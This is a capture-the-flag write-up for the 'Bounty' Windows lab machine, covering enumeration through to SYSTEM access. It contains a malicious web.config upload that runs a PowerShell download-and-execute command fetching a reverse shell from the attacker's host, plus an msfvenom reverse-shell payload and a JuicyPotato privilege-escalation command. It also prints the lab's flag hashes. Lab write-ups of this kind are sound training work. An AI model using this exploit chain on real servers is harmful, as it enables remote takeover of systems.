# CTF Writeup: Bounty

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.36.219
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 06:41 -0500
Nmap scan report for 10.129.36.219
Host is up (0.023s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   23.65 ms 10.10.14.1
2   23.61 ms 10.129.36.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
```

Upon analysing the webpage, there is only an merlin .jpg file.

Enumerating endpoints reveals the following endpoints, which aren't accessible.

```
gobuster dir -u http://10.129.36.219 -w /usr/share/wordlists/dirb/common.txt -x php,html,xml,zip
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.36.219
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,xml,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 158] [--> http://10.129.36.219/aspnet_client/]
/uploadedfiles        (Status: 301) [Size: 158] [--> http://10.129.36.219/uploadedfiles/]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```

Mapped target ip to domain "bounty.htb" in our local dns file /etc/hosts.

```
echo "10.129.36.219 bounty.htb" | sudo tee -a /etc/hosts
```

Enumerated subdomains, but didn't find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://bounty.htb -H "Host: FUZZ.bounty.htb" -fs 630

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bounty.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.bounty.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 630
________________________________________________

:: Progress: [100000/100000] :: Job [1/1] :: 1550 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
```

Enumerated file extensions and retrieved an interesting .aspx file.

```
gobuster dir -u http://bounty.htb -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bounty.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              zip,json,docx,aspx,txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 155] [--> http://bounty.htb/aspnet_client/]
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles        (Status: 301) [Size: 155] [--> http://bounty.htb/uploadedfiles/]
Progress: 36904 / 36904 (100.00%)
===============================================================
Finished
===============================================================
```

Upon inspecting it, it seems to be an upload functionality.

I checked a lot of file extensions by doing an sniper attack with Burp Intruder.

```
.asp
.asa
.inc
.aspx
.ascx
.asmx
.ashx
.axd
.svc
.cshtml
.vbhtml
.razor
.cs
.vb
.config
.xml
.json
.xsd
.htm
.html
.css
.js
.map
.txt
.dll
.pdb
.csproj
.vbproj
.sln
.log
.etl
.dmp
```

the .config file extension seemed to have an different length than the other file extensions which means that this file extension isn't being filtered out.

```
![[Pasted image 20260110140809.png]]
```

Searching up this topic, we found out that we can embedd .aspx code within the .config file.
We found an PoC for this .config file which downloads and executes an Niashang Reverse Shell from our local running webserver.

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add
        name="web_config"
        path="*.config"
        verb="*"
        modules="IsapiModule"
        scriptProcessor="%windir%\system32\inetsrv\asp.dll"
        resourceType="Unspecified"
        requireAccess="Write"
        preCondition="bitness64" />
    </handlers>

    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>

  <appSettings>
  </appSettings>
</configuration>

<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.161:8082/Invoke-PowerShellTcp.ps1')")
%>
```

Let's start up our python server.

```
python3 -m http.server 8082
```

Let's start up an listener on port 80, so firewall doesn't block it.

```
rlwrap -f . -r nc -lvnp 80
```

Uploaded our web.config file and accessed it on http://bounty.htb/uploadedfiles/web.config, which executed our .aspx code in our web.config file. Our Niashang .ps1 reverse shell script got downloaded onto the target system and executed. 

Gained RCE as user "bounty\merlin".

```
rlwrap -f . -r nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.36.219] 49160
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>
```

Retrieved user.txt in C:\Users\merlin\Desktop.

```
bed998b156a2524e84066ca448e51406
```

Enumerated privileges for user "bounty\merlin".

```
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Enumerated System Information.

```
PS C:\> systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
```

This Server should be vulnerable to PrintSpoofer, let's try it!

Started up smb server on local machine and put PrintSpoofer.exe in /htb share.

```
systemctl start smbd
cp PrintSpoofer.exe /srv/smb
```

Downloaded file onto target machine.

```
copy \\10.10.14.161/htb/PrintSpoofer.exe
```

After running it, it didn't work.

```
.\PrintSpoofer.exe -i -c cmd.exe
```

We previously got the information that we are running an very outdated windows 2008 server with basically no hotfixes or patches in place.
Which means almost every single windows kernel exploit would work.
I decided to utilize JuicyPotato which is quiet effective for Windows Server 2008's.

Put it inside my smb share. 

```
cp JuicyPotato.exe /srv/smb
```

Downloaded it onto target system.

```
copy \\10.10.14.161/htb/JuicyPotato.exe
```

The Syntax for this application is as following: 

```
jp32.exe -t * -p shell.exe -l 8888 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```

It steals an CLSID of an system process and executes an malicious .exe reverse shell script with those permissions, which grants us system shell.

Let's generate an .exe payload with msfvenom inside my smb share.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```

Downloaded it onto the target system.

```
copy \\10.10.14.161/htb/rev.exe
```

Started up my listener on port 443.

```
nc -lvnp 443
```

Executed JuicyPotato.exe

```
C:\Temp>JuicyPotato.exe -t * -p rev.exe -l 443 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
JuicyPotato.exe -t * -p rev.exe -l 443 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 443
....
[+] authresult 0
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Gained RCE as user "nt authority\system".

```
nc -lvnp 443        
listening on [any] 443 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.36.219] 49173
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
f9eabd5d1b52a6b082739d2f4228b25f
```
